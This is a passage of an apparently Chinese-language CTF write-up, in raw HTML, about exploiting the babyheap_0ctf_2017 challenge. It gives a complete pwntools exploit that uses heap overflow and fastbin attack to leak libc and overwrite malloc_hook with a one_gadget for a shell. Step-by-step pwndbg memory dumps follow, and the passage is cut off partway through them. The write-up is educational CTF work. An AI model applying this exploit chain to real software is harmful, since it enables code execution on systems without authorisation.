class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">'debug'</span><br>p = process(<span class="hljs-string">'./babyheap_0ctf_2017_patch'</span>)<br>elf = ELF(<span class="hljs-string">'./babyheap_0ctf_2017_patch'</span>)<br><br><span class="hljs-comment">#首先是定义的一些函数，对应着程序的功能</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">alloc</span>(<span class="hljs-params">size</span>):<br>    p.recvuntil(<span class="hljs-string">"Command: "</span>)<br>    p.sendline(<span class="hljs-string">"1"</span>)<br>    p.recvuntil(<span class="hljs-string">"Size: "</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fill</span>(<span class="hljs-params">idx, content</span>):<br>    p.recvuntil(<span class="hljs-string">"Command: "</span>)<br>    p.sendline(<span class="hljs-string">"2"</span>)<br>    p.recvuntil(<span class="hljs-string">"Index: "</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br>    p.recvuntil(<span class="hljs-string">"Size: "</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(content)))<br>    p.recvuntil(<span class="hljs-string">"Content: "</span>)<br>    p.send(content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>):<br>    p.recvuntil(<span class="hljs-string">"Command: "</span>)<br>    p.sendline(<span class="hljs-string">"3"</span>)<br>    p.recvuntil(<span class="hljs-string">"Index: "</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dump</span>(<span class="hljs-params">idx</span>):<br>    p.recvuntil(<span class="hljs-string">"Command: "</span>)<br>    p.sendline(<span class="hljs-string">"4"</span>)<br>    p.recvuntil(<span class="hljs-string">"Index: "</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br>    p.recvline()<br>    <span class="hljs-keyword">return</span> p.recvline()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">unsorted_offset_arena</span>(<span class="hljs-params">idx</span>):<br>    word_bytes = context.word_size / <span class="hljs-number">8</span><br>    offset = <span class="hljs-number">4</span>  <span class="hljs-comment"># lock</span><br>    offset += <span class="hljs-number">4</span>  <span class="hljs-comment"># flags</span><br>    offset += word_bytes * <span class="hljs-number">10</span>  <span class="hljs-comment"># offset fastbin</span><br>    offset += word_bytes * <span class="hljs-number">2</span>  <span class="hljs-comment"># top,last_remainder</span><br>    offset += idx * <span class="hljs-number">2</span> * word_bytes  <span class="hljs-comment"># idx</span><br>    offset -= word_bytes * <span class="hljs-number">2</span>  <span class="hljs-comment"># bin overlap</span><br>    <span class="hljs-keyword">return</span> offset<br><br><span class="hljs-comment">#首先申请4个fast chunk和1个small chunk</span><br>alloc(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#index0</span><br>alloc(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#index1</span><br>alloc(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#index2</span><br>alloc(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#index3</span><br>alloc(<span class="hljs-number">0x80</span>)<span class="hljs-comment">#index4</span><br><br><span class="hljs-comment">#free两个,这时候会放到fastbins中,而且因为是后进的,所以</span><br><span class="hljs-comment">#fastbin[0]-&gt;index2-&gt;index1-&gt;NULL</span><br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">2</span>)<br><br><span class="hljs-comment">#这个时候我们去对index0进行fill操作,他就会把index2的指针的末位改成0x80,也就指向了index4</span><br><span class="hljs-comment">#解释一下,前面申请了4块0x10的,加上chunk的一些信息,合起来是0x80</span><br><span class="hljs-comment">#所以把那个末位改成0x80就指向了index4,这样chunk4就被放到了fastbins中</span><br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span><br>payload += p64(<span class="hljs-number">0x21</span>)<br>payload += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span><br>payload += p64(<span class="hljs-number">0x21</span>)<br>payload += p8(<span class="hljs-number">0x80</span>)<br>fill(<span class="hljs-number">0</span>, payload)<br><br><span class="hljs-comment">#然后再通过index3去进行写入,把index4的大小改成0x21</span><br><span class="hljs-comment">#这么做是因为当申请index4这块内存的时候,他会检查大小是不是fast chunk的范围内</span><br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span><br>payload += p64(<span class="hljs-number">0x21</span>)<br>fill(<span class="hljs-number">3</span>, payload)<br><br><span class="hljs-comment">#改好index4的大小之后去申请两次，这样就把原来的fastbins中的给申请出来了</span><br>alloc(<span class="hljs-number">0x10</span>)<br>alloc(<span class="hljs-number">0x10</span>)<br><br><span class="hljs-comment">#申请成功之后index2就指向index4</span><br><span class="hljs-comment">#为了让index4能够被放到unsortedbins中,要把它的大小改回来</span><br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span><br>payload += p64(<span class="hljs-number">0x91</span>)<br>fill(<span class="hljs-number">3</span>, payload)<br><br><span class="hljs-comment">#再申请一个防止index4与top chunk合并了</span><br>alloc(<span class="hljs-number">0x80</span>)<br><br><span class="hljs-comment">#这时候free就会把index4放到unsorted中了</span><br>free(<span class="hljs-number">4</span>)<br><br><span class="hljs-comment">#因为index2是指向index4的，所以直接把index2给dump一下就能拿到index4中前一部分的内容了</span><br><span class="hljs-comment">#main_arena与libc偏移为0x3c4b20(文末有工具算)</span><br><span class="hljs-comment">#再加上main_arena与unsortedbin的偏移,得到unsortedbins与libc的偏移</span><br>unsorted_offset_mainarena=unsorted_offset_arena(<span class="hljs-number">5</span>)<span class="hljs-comment">#这函数还不太明白</span><br>unsorted_addr=u64(dump(<span class="hljs-number">2</span>)[:<span class="hljs-number">8</span>].strip().ljust(<span class="hljs-number">8</span>, <span class="hljs-string">"\x00"</span>))<br>libc_base=unsorted_addr-<span class="hljs-number">0x3c4b20</span>-unsorted_offset_mainarena<br>log.info(<span class="hljs-string">"libc_base: "</span>+<span class="hljs-built_in">hex</span>(libc_base))<br><span class="hljs-comment">#此时因为fastbins中没有了,所以从unsortedbins中找</span><br>alloc(<span class="hljs-number">0x60</span>)<br><br><span class="hljs-comment">#index2还是指向index4那个地方我们可以先释放index4</span><br>free(<span class="hljs-number">4</span>)<br><br><span class="hljs-comment">#然后修改fd指针,通过index2往index4上写为malloc_hook,这样再次申请的时候会分配到这个地址</span><br><span class="hljs-comment">#但问题是我们去申请的时候会检查size是不是 fakefd + 8 == 当前fastbin的大小</span><br><span class="hljs-comment">#这个地址是main_arena-0x40+0xd,具体看后面图片解释</span><br>payload = p64(libc_base+<span class="hljs-number">0x3c4aed</span>)<br>fill(<span class="hljs-number">2</span>, payload)<br><br><span class="hljs-comment">#这时候再去申请两个,第一个是给前面free的index4,第二个就会分配到malloc_hook处</span><br>alloc(<span class="hljs-number">0x60</span>)<span class="hljs-comment">#index4</span><br>alloc(<span class="hljs-number">0x60</span>)<span class="hljs-comment">#index6</span><br><br><span class="hljs-comment">#然后往malloc_hook上写one_gadget的地址</span><br>payload = p8(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span><br>payload += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span><br>payload += p64(libc_base+<span class="hljs-number">0x4527a</span>)<br>fill(<span class="hljs-number">6</span>, payload)<br><br><span class="hljs-comment">#再申请一下触发one_gadget</span><br>alloc(<span class="hljs-number">255</span>)<br><br>p.interactive()<br></code></pre></td></tr></tbody></table></figure><h3 id="漏洞利用思路"><a href="#漏洞利用思路" class="headerlink" title="漏洞利用思路"></a>漏洞利用思路</h3><p>从上面的内容可以看出，主要的漏洞是任意长度堆溢出。由于该程序几乎所有保护都开启了，所以我们必须要有一些泄漏才可以控制程序的流程。基本利用思路如下：</p><ul><li>利用 unsorted bin 地址泄漏 libc 基地址。（用unsortedbin的原因之后再说）</li><li>利用 fastbin attack中的Arbitrary Alloc技术将chunk 分配到 malloc_hook 附近。</li></ul><h3 id="1-leak-libc-addr"><a href="#1-leak-libc-addr" class="headerlink" title="1-leak-libc-addr"></a>1. leak libc_addr</h3><h4 id="1-1-模仿程序功能"><a href="#1-1-模仿程序功能" class="headerlink" title="1-1-模仿程序功能"></a>1-1 模仿程序功能</h4><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">alloc</span>(<span class="hljs-params">size</span>):<br>    p.recvuntil(<span class="hljs-string">"Command: "</span>)<br>    p.sendline(<span class="hljs-string">"1"</span>)<br>    p.recvuntil(<span class="hljs-string">"Size: "</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fill</span>(<span class="hljs-params">idx, content</span>):<br>    p.recvuntil(<span class="hljs-string">"Command: "</span>)<br>    p.sendline(<span class="hljs-string">"2"</span>)<br>    p.recvuntil(<span class="hljs-string">"Index: "</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br>    p.recvuntil(<span class="hljs-string">"Size: "</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(content)))<br>    p.recvuntil(<span class="hljs-string">"Content: "</span>)<br>    p.send(content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>):<br>    p.recvuntil(<span class="hljs-string">"Command: "</span>)<br>    p.sendline(<span class="hljs-string">"3"</span>)<br>    p.recvuntil(<span class="hljs-string">"Index: "</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dump</span>(<span class="hljs-params">idx</span>):<br>    p.recvuntil(<span class="hljs-string">"Command: "</span>)<br>    p.sendline(<span class="hljs-string">"4"</span>)<br>    p.recvuntil(<span class="hljs-string">"Index: "</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br>    p.recvline()<br>    <span class="hljs-keyword">return</span> p.recvline()<br></code></pre></td></tr></tbody></table></figure><p>这4个函数分别对应程序的四个主要功能，这里就不多说了。</p><h4 id="1-2-申请-5个chunk"><a href="#1-2-申请-5个chunk" class="headerlink" title="1-2-申请-5个chunk"></a>1-2 申请 5个chunk</h4><p>由于我们希望使用 unsorted bin 来泄漏 libc 基地址，**所以必须要有 chunk 可以被链接到 unsorted bin 中，所以该 chunk 不能被回收到 fastbin chunk，也不能和 top chunk 相邻。因为后者在不是fastbin 的情况下，会被合并到 top chunk 中。**具体设计如下：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">alloc(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#index0</span><br>alloc(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#index1</span><br>alloc(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#index2</span><br>alloc(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#index3</span><br>alloc(<span class="hljs-number">0x80</span>)<span class="hljs-comment">#index4</span><br></code></pre></td></tr></tbody></table></figure><p>执行完此payload之后的heap情况如下：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; x/<span class="hljs-number">50</span>gx <span class="hljs-number">0x555555757000</span><br><span class="hljs-number">0x555555757000</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> #index0<br><span class="hljs-number">0x555555757010</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757020</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> #index1<br><span class="hljs-number">0x555555757030</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757040</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> #index2<br><span class="hljs-number">0x555555757050</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757060</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> #index3<br><span class="hljs-number">0x555555757070</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757080</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000091</span> #index4<br>......（省略内容均为空）<br><span class="hljs-number">0x555555757110</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000020ef1</span> #top_chunk<br></code></pre></td></tr></tbody></table></figure><p>此时程序结构体中的情况：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">0x5fcead98720</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x5fcead98730</span>:<span class="hljs-number">0x0000000000000001</span><span class="hljs-number">0x0000000000000010</span><br>    #index0<br><span class="hljs-number">0x5fcead98740</span>:<span class="hljs-number">0x0000555555757010</span><span class="hljs-number">0x0000000000000001</span><br>    #index1<br><span class="hljs-number">0x5fcead98750</span>:<span class="hljs-number">0x0000000000000010</span><span class="hljs-number">0x0000555555757030</span><br><span class="hljs-number">0x5fcead98760</span>:<span class="hljs-number">0x0000000000000001</span><span class="hljs-number">0x0000000000000010</span><br>     #index2<br><span class="hljs-number">0x5fcead98770</span>:<span class="hljs-number">0x0000555555757050</span><span class="hljs-number">0x0000000000000001</span><br>    #index3<br><span class="hljs-number">0x5fcead98780</span>:<span class="hljs-number">0x0000000000000010</span><span class="hljs-number">0x0000555555757070</span><br><span class="hljs-number">0x5fcead98790</span>:<span class="hljs-number">0x0000000000000001</span><span class="hljs-number">0x0000000000000080</span><br>    #index4<br><span class="hljs-number">0x5fcead987a0</span>:<span class="hljs-number">0x0000555555757090</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x5fcead987b0</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br></code></pre></td></tr></tbody></table></figure><h4 id="1-3-free创建的index1和index2"><a href="#1-3-free创建的index1和index2" class="headerlink" title="1-3-free创建的index1和index2"></a>1-3 free创建的index1和index2</h4><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#free两个,这时候会放到fastbins中,而且因为是后进的,所以</span><br><span class="hljs-comment">#fastbin[0]-&gt;index2-&gt;index1-&gt;NULL</span><br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">2</span>)<br></code></pre></td></tr></tbody></table></figure><p>执行此部分payload，来看一下堆状况：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; x/50gx <span class="hljs-number">0x555555757000</span><br><span class="hljs-number">0x555555757000</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index0</span><br><span class="hljs-number">0x555555757010</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757020</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index1</span><br><span class="hljs-number">0x555555757030</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757040</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index2</span><br><span class="hljs-number">0x555555757050</span>:<span class="hljs-number">0x0000555555757020</span><span class="hljs-number">0x0000000000000000</span><br>    <span class="hljs-comment">#fd指针指向index1的起始地址</span><br><span class="hljs-number">0x555555757060</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index3</span><br><span class="hljs-number">0x555555757070</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757080</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000091</span> <span class="hljs-comment">#index4</span><br><span class="hljs-number">0x555555757090</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>.....（省略内容均为空）<br><span class="hljs-number">0x555555757110</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000020ef1</span> <span class="hljs-comment">#top_chunk</span><br>.....（省略内容均为空）<br>pwndbg&gt;<br></code></pre></td></tr></tbody></table></figure><p>此时的bin和main_arena情况：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; <span class="hljs-built_in">bin</span><br>fastbins<br><span class="hljs-number">0x20</span>: <span class="hljs-number">0x0000555555757020</span>-&gt;<span class="hljs-number">0x555555757040</span> ◂— <span class="hljs-number">0x0</span><br><span class="hljs-number">0x30</span>: <span class="hljs-number">0x0</span><br><span class="hljs-number">0x40</span>: <span class="hljs-number">0x0</span><br><span class="hljs-number">0x50</span>: <span class="hljs-number">0x0</span><br><span class="hljs-number">0x60</span>: <span class="hljs-number">0x0</span><br><span class="hljs-number">0x70</span>: <span class="hljs-number">0x0</span><br><span class="hljs-number">0x80</span>: <span class="hljs-number">0x0</span><br>unsortedbin<br><span class="hljs-built_in">all</span>: <span class="hljs-number">0x0</span><br>smallbins<br>empty<br>largebins<br>empty<br>pwndbg&gt; x/16gx &amp;main_arena<br><span class="hljs-number">0x7ffff7dd1b20</span> &lt;main_arena&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000555555757040</span> <span class="hljs-comment">#index2</span><br><span class="hljs-number">0x7ffff7dd1b30</span> &lt;main_arena+<span class="hljs-number">16</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b40</span> &lt;main_arena+<span class="hljs-number">32</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b50</span> &lt;main_arena+<span class="hljs-number">48</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b60</span> &lt;main_arena+<span class="hljs-number">64</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b70</span> &lt;main_arena+<span class="hljs-number">80</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000555555757110</span> <span class="hljs-comment">#top_chunk</span><br><span class="hljs-number">0x7ffff7dd1b80</span> &lt;main_arena+<span class="hljs-number">96</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x00007ffff7dd1b78</span><br><span class="hljs-number">0x7ffff7dd1b90</span> &lt;main_arena+<span class="hljs-number">112</span>&gt;:<span class="hljs-number">0x00007ffff7dd1b78</span><span class="hljs-number">0x00007ffff7dd1b88</span><br>pwndbg&gt;<br></code></pre></td></tr></tbody></table></figure><p>程序的结构体状况如下：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">0x5fcead98730</span>:<span class="hljs-number">0x0000000000000001</span><span class="hljs-number">0x0000000000000010</span><br>    #index0<br><span class="hljs-number">0x5fcead98740</span>:<span class="hljs-number">0x0000555555757010</span><span class="hljs-number">0x0000000000000000</span><br>    #index1（chunk_flag置零）<br><span class="hljs-number">0x5fcead98750</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>                #chunk_content_size置零   #chunk_data_ptr置空     <br><span class="hljs-number">0x5fcead98760</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>     #index2（chunk_flag置零）  #chunk_data_size置零     <br><span class="hljs-number">0x5fcead98770</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000001</span><br>    #chunk_data_ptr置空  #index3<br><span class="hljs-number">0x5fcead98780</span>:<span class="hljs-number">0x0000000000000010</span><span class="hljs-number">0x0000555555757070</span><br><span class="hljs-number">0x5fcead98790</span>:<span class="hljs-number">0x0000000000000001</span><span class="hljs-number">0x0000000000000080</span><br>    #index4<br><span class="hljs-number">0x5fcead987a0</span>:<span class="hljs-number">0x0000555555757090</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x5fcead987b0</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br></code></pre></td></tr></tbody></table></figure><h4 id="1-4-对-index0-进行-fill-操作，溢出修改-index2-和-fd-指针"><a href="#1-4-对-index0-进行-fill-操作，溢出修改-index2-和-fd-指针" class="headerlink" title="1-4-对-index0-进行-fill-操作，溢出修改-index2-和-fd-指针"></a>1-4 对 index0 进行 fill 操作，溢出修改 index2 和 fd 指针</h4><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs py">payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span><br>payload += p64(<span class="hljs-number">0x21</span>)<br>payload += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span><br>payload += p64(<span class="hljs-number">0x21</span>)<br>payload += p8(<span class="hljs-number">0x80</span>)<br>fill(<span class="hljs-number">0</span>, payload)<br></code></pre></td></tr></tbody></table></figure><p>还记得上面提到的程序漏洞吗？<br>第一次执行Allocate函数时chunk_content_size是我们指定的，但是fill的时候并没有将新的chunk_content_size写入到结构体中，并且之前alloc chunk时指定的堆块size大小没有发生改变，所以这里就出现了任意堆溢出的情形。<br>这一小段payload的目的是：通过fill index0溢出修改index2的fd指针为index4的地址，此处的payload只用修改fd的最后一个字节为0x80即可。<br>执行payload之后的内存空间如下：</p><blockquote><p>chunk2-&gt;fd已成功修改为chunk4的起始地址（这个起始地址是指向chunk header的）</p></blockquote><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; x/50gx <span class="hljs-number">0x555555757000</span><br><span class="hljs-number">0x555555757000</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index0</span><br><span class="hljs-number">0x555555757010</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>                <span class="hljs-comment">#payload从这里开始修改堆块内容</span><br><span class="hljs-number">0x555555757020</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index1</span><br><span class="hljs-number">0x555555757030</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757040</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index2（fastbin）</span><br><span class="hljs-number">0x555555757050</span>:<span class="hljs-number">0x0000555555757080</span><span class="hljs-number">0x0000000000000000</span><br>    <span class="hljs-comment">#此处的fd指针已经被修改</span><br>--------------------------------------------------------------    <br>执行payload前原来的内容为：<br><span class="hljs-number">0x555555757050</span>:<span class="hljs-number">0x0000555555757020</span><span class="hljs-number">0x0000000000000000</span><br>--------------------------------------------------------------    <br><span class="hljs-number">0x555555757060</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index3</span><br><span class="hljs-number">0x555555757070</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757080</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000091</span> <span class="hljs-comment">#index4（fastbin）</span><br><span class="hljs-number">0x555555757090</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>.....（省略内容均为空）<br><span class="hljs-number">0x555555757110</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000020ef1</span> <span class="hljs-comment">#top_chunk</span><br>.....（省略内容均为空）<br>pwndbg&gt;  <br></code></pre></td></tr></tbody></table></figure><h4 